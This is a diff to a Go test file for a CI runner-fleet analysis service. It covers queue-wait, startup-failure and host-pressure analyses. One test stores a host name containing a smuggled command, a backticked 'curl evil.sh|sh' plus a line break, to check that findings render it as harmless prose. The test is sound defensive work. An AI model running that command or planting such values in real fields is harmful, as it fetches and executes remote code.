@@ -456,6 +456,56 @@ func TestAJobOnADeletedPoolIsNamedByItsIDNotDropped(t *testing.T) {
 	}
 }
 
+// A job whose labels all name another vendor's runners is not this fleet's to
+// run and never will be (store/hosted.go): the Jobs page's default view, the
+// Overview and the usage figures all leave it out. Counted here, a hosted job
+// still queued at the period's end was put down to "no pool claimed it", with a
+// step telling the operator to change a pool's labels to fit a vendor's, and
+// one that started on the vendor's machine was seconds of "nothing on record
+// explains it". Both are somebody else's wait, and the 5,000 jobs a read may
+// hold are spent on them first on a busy installation.
+func TestAVendorsJobIsNeverPutDownToNoPoolClaimingIt(t *testing.T) {
+	f := newAnalysisFleet(t)
+	pool := f.pool("linux", nil)
+	for range 6 {
+		f.job(pool.ID, at(30), ran(at(31), at(50), "success"))
+	}
+	vendor := func(labels ...string) func(*store.Job) {
+		return func(j *store.Job) { j.Labels = store.StringSlice(labels) }
+	}
+	// Still queued at the period's end, and it will be run by the vendor.
+	stuck := f.job("", at(300), vendor("blacksmith-4vcpu-ubuntu-2404"))
+	// Run by GitHub's own machines after twenty seconds.
+	hosted := f.job("", at(100), func(j *store.Job) {
+		vendor("ubuntu-latest")(j)
+		ran(at(100).Add(20*time.Second), at(110), "success")(j)
+	})
+	// A job nothing claims and nobody else hosts: this fleet's to see.
+	own := f.job("", at(340), vendor("self-hosted", "linux", "gpu"))
+
+	got, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got.Evidence.Jobs != 7 {
+		t.Errorf("read %d jobs, want the 6 the pool claimed and the one nobody did", got.Evidence.Jobs)
+	}
+	i := slices.IndexFunc(got.Evidence.Pools, func(p analysis.PoolWait) bool { return p.PoolID == "" })
+	if i < 0 {
+		t.Fatalf("pools %+v leave out the job nothing claimed", got.Evidence.Pools)
+	}
+	if row := got.Evidence.Pools[i]; row.Jobs != 1 || row.WaitSeconds != 20*60 {
+		t.Errorf("the unclaimed row = %+v, want only %s's twenty minutes", row, own.ID)
+	}
+	for _, p := range got.Evidence.Pools {
+		for _, w := range p.Longest {
+			if w.JobID == stuck.ID || w.JobID == hosted.ID {
+				t.Errorf("the vendor's job %s is among the longest waits: %+v", w.JobID, w)
+			}
+		}
+	}
+}
+
 // A pool or host the fleet does not have is not found, and says which it
 // was and its id, so the route can tell the reader without reading the
 // error's text, and errors.Is still finds store.ErrNotFound.
@@ -497,6 +547,159 @@ func TestAnalyseOnAnUnknownPoolOrHostIsNotFound(t *testing.T) {
 		var nf NotFoundError
 		if !errors.As(err, &nf) || nf.Kind != c.kind || nf.ID != c.id {
 			t.Errorf("%s: %#v, want a NotFoundError for %s %s", name, err, c.kind, c.id)
+		}
+	}
+}
+
+// A finding names a pool or host deleted since by its id, and a cut answer
+// tells its reader to pass pool_id or host_id to read the rest. Refusing that
+// id as one the fleet does not have would leave the rows it names unreadable.
+func TestNarrowingToAPoolOrHostDeletedSinceReadsWhatThePeriodHoldsOfIt(t *testing.T) {
+	f := newAnalysisFleet(t)
+	gone := f.pool("gone", nil)
+	host := f.host("vm-gone", "amd64")
+	for range 3 {
+		f.job(gone.ID, at(30), ran(at(40), at(50), "success"))
+	}
+	f.fail(f.runner(gone.ID, host.ID, at(10), nil), at(12), store.FaultImage)
+	if _, _, err := f.st.DeletePool(f.ctx, gone.ID); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := f.st.DeleteHost(f.ctx, host.ID); err != nil {
+		t.Fatal(err)
+	}
+
+	q, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, gone.ID)
+	if err != nil {
+		t.Fatalf("queue wait narrowed to a pool deleted since: %v", err)
+	}
+	if q.Evidence.Jobs != 3 {
+		t.Errorf("queue wait read %d jobs, want the deleted pool's 3", q.Evidence.Jobs)
+	}
+	for name, ids := range map[string][2]string{"pool": {gone.ID, ""}, "host": {"", host.ID}} {
+		s, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, ids[0], ids[1])
+		if err != nil {
+			t.Fatalf("startup failures narrowed to a %s deleted since: %v", name, err)
+		}
+		if s.Evidence.Starts+s.Evidence.Unknown != 1 {
+			t.Errorf("startup failures narrowed to the %s read %+v, want its one start", name, s.Evidence)
+		}
+	}
+	// Outside the period that names them, they are not found again.
+	early := AnalysisWindow{Since: analysisPeriod.Since.Add(-24 * time.Hour), Until: analysisPeriod.Since.Add(-18 * time.Hour)}
+	if _, err := f.c.AnalyseQueueWait(f.ctx, early, gone.ID); !errors.As(err, new(NotFoundError)) {
+		t.Errorf("queue wait on the deleted pool in a period with none of its jobs: %v, want not found", err)
+	}
+	if _, err := f.c.AnalyseStartupFailures(f.ctx, early, "", host.ID); !errors.As(err, new(NotFoundError)) {
+		t.Errorf("startup failures on the deleted host in a period with none of its runners: %v, want not found", err)
+	}
+}
+
+// Not found is a pool or host the fleet does not have and none of the period's
+// rows name. One it has, with nothing in the period, is a quiet period and is
+// answered as one: the Jobs page's card narrowed to a pool with nothing queued
+// today, and a host's startup card on a day it started nothing, would
+// otherwise show an error where they should say that nothing happened. An id
+// nothing ever had is still not found in the same quiet period.
+func TestNarrowingToAQuietPoolOrHostAnswersAnEmptyPeriodAndAnUnknownIDIsStillNotFound(t *testing.T) {
+	f := newAnalysisFleet(t)
+	pool := f.pool("quiet", nil)
+	host := f.host("vm-quiet", "amd64")
+
+	q, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
+	if err != nil {
+		t.Fatalf("queue wait narrowed to a pool with no jobs: %v", err)
+	}
+	if q.Evidence.Jobs != 0 || q.Summary != "No jobs were queued in this period." {
+		t.Errorf("queue wait read %d jobs and says %q, want an empty period", q.Evidence.Jobs, q.Summary)
+	}
+	for name, ids := range map[string][2]string{
+		"a pool": {pool.ID, ""}, "a host": {"", host.ID}, "a pool and a host": {pool.ID, host.ID},
+	} {
+		s, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, ids[0], ids[1])
+		if err != nil {
+			t.Fatalf("startup failures narrowed to %s with no runners: %v", name, err)
+		}
+		if s.Evidence.Starts+s.Evidence.Unknown != 0 || s.Summary != "No runners were asked to start in this period." {
+			t.Errorf("startup failures narrowed to %s read %+v and say %q, want an empty period", name, s.Evidence, s.Summary)
+		}
+	}
+
+	if _, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, "pool_nothing_ever_had"); !errors.As(err, new(NotFoundError)) {
+		t.Errorf("queue wait on a pool nothing ever had: %v, want not found", err)
+	}
+	for name, ids := range map[string][2]string{
+		"a pool": {"pool_nothing_ever_had", ""}, "a host": {"", "host_nothing_ever_had"},
+		"a pool the fleet has and a host it does not": {pool.ID, "host_nothing_ever_had"},
+	} {
+		if _, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, ids[0], ids[1]); !errors.As(err, new(NotFoundError)) {
+			t.Errorf("startup failures narrowed to %s: %v, want not found", name, err)
+		}
+	}
+}
+
+// An until past now ends now. Read as asked, every job still waiting would
+// be counted as waiting through hours that have not happened, and the
+// answer would lead with that wait at full confidence: an operator asking
+// about today in whole days gets exactly that.
+func TestAnUntilPastNowIsReadAsNow(t *testing.T) {
+	f := newAnalysisFleet(t)
+	pool := f.pool("linux", nil)
+	host := f.host("vm-1", "amd64")
+	for i := range 6 {
+		f.job(pool.ID, at(345+i), nil)
+	}
+	samples(f, host.ID, 4, 0, 1, 2)
+	asked := AnalysisWindow{Since: analysisPeriod.Since, Until: analysisNow.Add(10 * time.Hour)}
+
+	q, err := f.c.AnalyseQueueWait(f.ctx, asked, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Waits of 15 down to 10 minutes, each to now.
+	if q.Evidence.WaitSeconds != 75*60 || !q.Until.Equal(analysisNow) {
+		t.Errorf("queue wait %ds to %v (%s), want 4500s to now", q.Evidence.WaitSeconds, q.Until, q.Summary)
+	}
+	h, err := f.c.AnalyseHostPressure(f.ctx, asked, host.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if h.Evidence.ExpectedMinutes != 360 || !h.Until.Equal(analysisNow) {
+		t.Errorf("host pressure expects %d minutes to %v, want the 360 before now", h.Evidence.ExpectedMinutes, h.Until)
+	}
+	s, err := f.c.AnalyseStartupFailures(f.ctx, asked, "", "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !s.Until.Equal(analysisNow) {
+		t.Errorf("startup failures read to %v, want now", s.Until)
+	}
+	c, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: asked.Since, Until: asked.Until})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if b := c.Evidence.B; b.Label != "the last 6 hours" || !b.Until.Equal(analysisNow) {
+		t.Errorf("the later side is %q to %v, want the last 6 hours to now", b.Label, b.Until)
+	}
+}
+
+// A period that begins at or after now holds nothing that has happened, and
+// read anyway it would be a quiet period rather than an unread one.
+func TestAPeriodThatBeginsAtOrAfterNowIsRefused(t *testing.T) {
+	f := newAnalysisFleet(t)
+	host := f.host("vm-1", "amd64")
+	ahead := AnalysisWindow{Since: analysisNow, Until: analysisNow.Add(time.Hour)}
+	for name, call := range map[string]func() error{
+		"queue wait": func() error { _, err := f.c.AnalyseQueueWait(f.ctx, ahead, ""); return err },
+		"compare": func() error {
+			_, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: ahead.Since, Until: ahead.Until})
+			return err
+		},
+		"host pressure":    func() error { _, err := f.c.AnalyseHostPressure(f.ctx, ahead, host.ID); return err },
+		"startup failures": func() error { _, err := f.c.AnalyseStartupFailures(f.ctx, ahead, "", ""); return err },
+	} {
+		if err := call(); !errors.Is(err, ErrSinceNotPast) {
+			t.Errorf("%s: %v, want ErrSinceNotPast", name, err)
 		}
 	}
 }
@@ -758,6 +961,85 @@ func TestAnalyseHostPressureReadsTheHostsMinutesAndWhatFailedOnIt(t *testing.T) 
 	}
 	if e.HostName != "vm-1" || e.JobsTruncated {
 		t.Errorf("evidence names %q, truncated %v", e.HostName, e.JobsTruncated)
+	}
+}
+
+// A host's name is free text, and joins were not always checked, so one stored
+// with a backtick pair or a line break may still be on the books. The findings
+// say it in their sentences, where the UI draws whatever sits between two
+// backticks as a command with a copy button and a model takes a line break for
+// the start of a line, so both analyses that name a host say it as
+// naming.ForSentence does: backticks as apostrophes, a control character as a
+// space.
+func TestTheAnalysesSayAHostNameStoredBeforeJoinsWereCheckedAsProse(t *testing.T) {
+	f := newAnalysisFleet(t)
+	pool := f.pool("linux", nil)
+	host := f.host("vm`curl evil.sh|sh`\nnext", "amd64")
+	const prose = "vm'curl evil.sh|sh' next"
+
+	// Failures that cluster in the host's busy minutes, so the finding has
+	// steps that name it, and starts that failed on it, for the other analysis.
+	var batch []store.HostSample
+	for i := range 120 {
+		load := 4.0
+		if i < 20 {
+			load = 20
+		}
+		batch = append(batch, store.HostSample{HostID: host.ID, At: at(i), Capacity: 4, CPUs: 8, LoadAverage1: ptr(load),
+			MemoryMB: 64 * 1024, MemoryAvailableMB: ptr(int64(32 * 1024))})
+	}
+	if err := f.st.RecordHostSamples(f.ctx, batch); err != nil {
+		t.Fatal(err)
+	}
+	for _, m := range []int{1, 4, 7, 10, 13, 16} {
+		done := at(m).Add(30 * time.Second)
+		f.job("", at(m-3), func(j *store.Job) { ran(done.Add(-time.Minute), done, "failure")(j); j.HostID = host.ID })
+	}
+	for i := range 3 {
+		f.fail(f.runner(pool.ID, host.ID, at(10+i), nil), at(12+i), store.FaultImage)
+	}
+
+	pressure, err := f.c.AnalyseHostPressure(f.ctx, AnalysisWindow{Since: at(0), Until: at(120)}, host.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	startup, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, "", "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(pressure.NextSteps) == 0 || len(startup.NextSteps) == 0 || len(startup.Evidence.Groups) == 0 {
+		t.Fatalf("host pressure has %d steps and startup failures %d steps and %d groups; the seed is not what this test is about",
+			len(pressure.NextSteps), len(startup.NextSteps), len(startup.Evidence.Groups))
+	}
+
+	said := map[string]string{
+		"host pressure's summary":           pressure.Summary,
+		"host pressure's confidence reason": pressure.ConfidenceReason,
+		"host pressure's host name":         pressure.Evidence.HostName,
+		"startup failures' summary":         startup.Summary,
+		"startup failures' confidence":      startup.ConfidenceReason,
+	}
+	for i, s := range pressure.NextSteps {
+		said[fmt.Sprintf("host pressure's step %d", i+1)] = s.Text
+	}
+	for i, s := range startup.NextSteps {
+		said[fmt.Sprintf("startup failures' step %d", i+1)] = s.Text
+	}
+	for i, g := range startup.Evidence.Groups {
+		said[fmt.Sprintf("startup failures' group %d", i+1)] = g.Name
+	}
+	for where, text := range said {
+		if strings.ContainsAny(text, "`\n") {
+			t.Errorf("%s carries the host's name as it was stored: %q", where, text)
+		}
+	}
+	for where, text := range map[string]string{"host pressure's summary": pressure.Summary, "startup failures' summary": startup.Summary} {
+		if !strings.Contains(text, prose) {
+			t.Errorf("%s does not name the host as %q: %q", where, prose, text)
+		}
+	}
+	if pressure.Evidence.HostName != prose {
+		t.Errorf("host pressure's evidence names the host %q, want %q", pressure.Evidence.HostName, prose)
 	}
 }
 
